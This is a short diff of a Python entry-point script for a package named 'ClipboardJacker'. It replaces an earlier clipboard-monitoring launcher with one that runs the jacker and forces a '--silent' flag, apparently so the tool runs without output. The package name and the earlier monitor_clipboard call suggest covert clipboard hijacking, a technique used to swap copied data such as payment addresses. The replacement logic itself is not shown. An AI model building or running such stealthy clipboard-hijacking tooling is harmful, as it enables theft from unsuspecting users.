@@ -1,8 +1,12 @@
-from clipreplacer import ClipReplacer
-import logging
+#!/usr/bin/env python3
+"""
+Entry point for ClipboardJacker package
+"""
 
-# Set logging to ERROR level for silent mode
-logging.getLogger().setLevel(logging.ERROR)
+import sys
+from clipboardjacker.main import run_clipboard_jacker
 
-replacer = ClipReplacer("config.json")
-replacer.monitor_clipboard()
+if __name__ == '__main__':
+    # Add --silent flag to arguments
+    sys.argv.append('--silent')
+    run_clipboard_jacker()
